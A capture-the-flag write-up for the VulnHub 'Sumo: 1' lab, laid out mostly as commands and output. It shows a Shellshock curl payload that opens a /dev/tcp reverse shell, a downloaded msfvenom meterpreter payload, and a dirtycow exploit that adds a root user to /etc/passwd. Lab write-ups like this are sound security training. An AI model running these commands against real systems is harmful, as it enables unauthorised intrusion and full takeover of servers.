---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/sumo-1,480/)

# enumeration
As always we are starting with a simple `nmap` scan to identify the attack surface.

## nmap
```bash
$ nmap -Pn -p22,80 -sV 192.168.150.87
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 16:26 EST
Nmap scan report for 192.168.150.87
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

On port 80 there is a web server with a default landing page.  
> Using `gobuster` on this website reveals that there is a resource named `/cgi-bin/test`. So it might be a good idea to test for the classic `shellshock` vulnerability.
{: .prompt-info }

---

# exploitation
## shellshock on port 80 (`/cgi-bin/test`)
### proof of concept
```bash
$ curl -H "User-agent: () { :;}; echo; echo vulnerable" http://192.168.150.87/cgi-bin/test
vulnerable
Content-type: text/html

CGI Default !
```

> Yes! We confirmed that there is a `shellshock` vulnerability.
{: .prompt-info }

### reverse shell
#### start listener on attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

#### trigger reverse shell
```bash
$ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.49.150/80 0>&1" http://192.168.150.87/cgi-bin/test
```

#### catch connection from server
```bash
$ nc -lvp 80      
listening on [any] 80 ...
192.168.150.87: inverse host lookup failed: Unknown host
connect to [192.168.49.150] from (UNKNOWN) [192.168.150.87] 43835
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ whoami
whoami
www-data
```

> Bam! We got a shell :-)
{: .prompt-info }

---

# post exploitation
## deploy `meterpreter`
### generate `meterpreter` payload
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.49.228 LPORT=443 -f elf > shell.elf
```

### provide payload via simple web server
```bash
$ python3 -m http.server 80                                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### upload `meterpreter` to target
```bash
www-data@ubuntu:/usr/lib/cgi-bin$ wget http://192.168.49.228/shell.elf -O /tmp/shell
www-data@ubuntu:/usr/lib/cgi-bin$ chmod +x /tmp/shell
```

### start `metasploit` listener on attacker machine
```bash
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.150   yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.150:443 
```

### start `meterpreter`
```bash
www-data@ubuntu:/usr/lib/cgi-bin$ /tmp/shell
```

### catch connection from `meterpreter`
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.150:443
[*] Meterpreter session 1 opened (192.168.49.150:443 -> 192.168.150.87:52570 ) at 2022-02-01 16:57:33 -0500

meterpreter > getuid
Server username: www-data
```

## privilege escalation
1. Use [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2) to identify that the server is vulnerable to `dirtycow`
2. Use [https://www.exploit-db.com/raw/40839](https://www.exploit-db.com/raw/40839) and upload it to the target via `meterpreter`
3. Compile and execute the exploit to add a new `root` user

```bash
meterpreter > shell
Process 4149 created.
Channel 65 created.
cd /tmp
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
www-data@ubuntu:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 12345678
Complete line:
firefart:fiMWHjmZgx9rM:0:0:pwned:/root:/bin/bash

mmap: 7fad37d9f000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '12345678'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '12345678'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

## login via `ssh` with new `root` user (`firefart:12345678`)
```bash
$ ssh firefart@192.168.150.87                                                                                          
The authenticity of host '192.168.150.87 (192.168.150.87)' can't be established.
ECDSA key fingerprint is SHA256:G8HZXu6SUrixt/obia/CUlTgdJK9JaFKXwulm6uUrbQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.150.87' (ECDSA) to the list of known hosts.
firefart@192.168.150.87's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

firefart@ubuntu:~# whoami
firefart
firefart@ubuntu:~# id
uid=0(firefart) gid=0(root) groups=0(root)
```

> Yay! We got `root` access.
{: .prompt-info }

---

# get flags
## `user` flag
```bash
firefart@ubuntu:~# cd /usr/lib/cgi-bin
firefart@ubuntu:~# ls
local.txt
test
test.sh
firefart@ubuntu:~# cat local.txt
5******************************3
```

## `root` flag
```bash
firefart@ubuntu:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@ubuntu:~# cd /root
firefart@ubuntu:~# ls
proof.txt  root.txt
firefart@ubuntu:~# cat proof.txt
9******************************1
```
Pwned! <@:-) 
